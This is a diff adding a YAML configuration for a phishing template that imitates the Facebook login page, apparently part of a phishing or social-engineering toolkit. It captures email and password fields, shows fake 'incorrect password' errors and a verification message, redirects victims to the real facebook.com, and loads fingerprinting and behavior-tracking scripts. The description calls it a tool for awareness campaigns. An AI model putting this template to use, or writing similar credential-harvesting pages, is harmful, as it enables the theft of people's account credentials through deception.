@@ -1,0 +1,35 @@
+info:
+  name: Facebook Login
+  author: mh4x0f
+  description: A phishing template that replicates the Facebook login interface, designed to capture user credentials in a realistic social media context. Ideal for awareness campaigns targeting general users across mobile and web platforms.
+  category: social
+  system: true
+  tags:
+    - facebook
+    - mobile
+    - web
+template_dir: facebook_login
+steps:
+  - id: login
+    title: Facebook Login
+    path: /login
+    method: POST
+    template_file: login.html
+    success_message: Login information received. Proceeding to verification...
+    redirect_url: https://www.facebook.com
+    capture:
+      enabled: true
+      fields:
+        - name: password
+          required: true
+          validate_regex: ^.{6,}$
+          error_message: The password is incorrect. Please try again..
+        - name: email
+          required: true
+          validate_regex: ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$
+          error_message: We couldn't find an account with that username. Try another
+    simulate_delay_ms: 300
+hooks:
+  onLoad:
+    - /hooks/fingerprint.js
+    - /hooks/behavior.js
